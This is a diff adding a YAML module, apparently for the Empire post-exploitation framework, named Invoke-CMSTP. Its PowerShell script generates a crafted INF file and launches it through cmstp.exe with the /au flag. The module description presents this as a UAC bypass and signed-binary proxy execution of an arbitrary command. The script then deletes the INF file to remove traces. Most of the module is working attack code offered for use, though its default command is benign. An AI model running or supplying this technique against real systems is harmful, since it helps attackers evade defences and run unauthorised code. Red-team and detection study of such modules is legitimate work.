@@ -1,0 +1,104 @@
+name: Invoke-CMSTP
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Generate an INF file dynamically and execute via cmstp.exe for UAC
+  bypass and signed binary proxy execution. CMSTP.exe is the Microsoft
+  Connection Manager Profile Installer, a legitimate binary that can
+  be abused to execute arbitrary commands via specially crafted INF
+  files. The RunPreSetupCommandsSection of the INF file is used to
+  embed the command, which executes with elevated privileges when
+  cmstp.exe processes the profile with the /au flag.
+software: ''
+tactics: [TA0005, TA0004]
+techniques: [T1218.003]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Command
+    description: Command to execute via the CMSTP INF payload.
+    required: true
+    value: 'powershell.exe -nop -Command Write-Host CMSTP_Bypass_Success'
+  - name: InfPath
+    description: >-
+      Path to write the dynamically generated INF file. Defaults to a temp directory
+      path.
+    required: false
+    value: '$env:TEMP\cmstp_bypass.inf'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-CMSTP {
+      param(
+          [string]$Command,
+          [string]$InfPath
+      )
+
+      $InfPath = $ExecutionContext.InvokeCommand.ExpandString($InfPath)
+
+      $InfContent = @"
+  [version]
+  Signature=`$chicago`$
+  AdvancedINF=2.5
+
+  [DefaultInstall_SingleUser]
+  UnRegisterOCXs=UnRegisterOCXSection
+
+  [UnRegisterOCXSection]
+  %11%\scrobj.dll,NI,{{25d-cmstp}}
+
+  [DefaultInstall]
+  CustomDestination=CustInstDestSectionAllUsers
+  RunPreSetupCommands=RunPreSetupCommandsSection
+
+  [RunPreSetupCommandsSection]
+  $Command
+  taskkill /IM cmstp.exe /F
+
+  [CustInstDestSectionAllUsers]
+  49000,49001=AllUSer_LDIDSection, 7
+
+  [AllUSer_LDIDSection]
+  "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+  [Strings]
+  ServiceName="Empire"
+  ShortSvcName="Empire"
+  "@
+
+      Write-Output "[*] Writing INF file to: $InfPath"
+      try {
+          $InfContent | Out-File -FilePath $InfPath -Encoding ASCII -ErrorAction Stop
+      } catch {
+          Write-Output "[-] Failed to write INF file: $($_.Exception.Message)"
+          return
+      }
+
+      Write-Output "[*] Executing cmstp.exe /s /au `"$InfPath`""
+      try {
+          $proc = Start-Process -FilePath "cmstp.exe" -ArgumentList "/s", "/au", "`"$InfPath`"" -PassThru -ErrorAction Stop
+          Write-Output "[+] CMSTP execution initiated (PID: $($proc.Id))."
+      } catch {
+          Write-Output "[-] Failed to launch cmstp.exe: $($_.Exception.Message)"
+      }
+
+      Start-Sleep -Seconds 2
+      Remove-Item -Path $InfPath -Force -ErrorAction SilentlyContinue
+      if (Test-Path $InfPath) {
+          Write-Output "[!] Warning: INF file not cleaned up: $InfPath"
+      }
+  }
+script_end: Invoke-CMSTP {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
